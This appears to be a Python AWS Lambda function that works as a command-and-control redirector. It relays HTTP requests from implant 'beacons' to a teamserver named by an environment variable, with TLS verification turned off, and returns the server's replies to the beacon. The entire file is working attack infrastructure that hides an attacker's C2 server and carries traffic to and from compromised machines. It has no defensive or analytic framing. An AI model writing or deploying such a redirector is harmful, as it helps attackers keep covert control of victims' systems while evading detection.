import base64
import os
import urllib3

from pprint import pprint


def redirector(event, context):

    print(event)

    #######
    # Forward HTTP request to C2
    #######

    http = urllib3.PoolManager(cert_reqs = 'CERT_NONE')

    # Setup forwarding URL
    teamserver = os.getenv("TEAMSERVER")
    url = "https://" + teamserver + event["requestContext"]["http"]["path"]

    # Parse Query String Parameters
    queryStrings = {}
    if "queryStringParameters" in event.keys():
        for key, value in event["queryStringParameters"].items():
            queryStrings[key] = value

    # Parse HTTP headers
    inboundHeaders = {}
    for key, value in event["headers"].items():
        inboundHeaders[key] = value

    # Handle potential base64 encodng of body
    body = ""
    if "body" in event.keys():
        if event["isBase64Encoded"]:
            body = base64.b64decode(event["body"])
        else:
            body = event["body"]

    # Forward request to C2
    resp = http.request(event["requestContext"]["http"]["method"], url, headers=inboundHeaders, fields=queryStrings, body=body)

    ########
    # Return response to beacon
    ########

    # Parse outbound HTTP headers
    outboundHeaders = {}
    for i in range(len(resp.headers.items())):
        outboundHeaders[resp.headers.items()[i][0]] = resp.headers.items()[i][1]

    # build response to beacon
    response = {
        "statusCode": resp.status,
        "body": resp.data.decode('utf-8'),
        "headers": outboundHeaders
    }

    return response
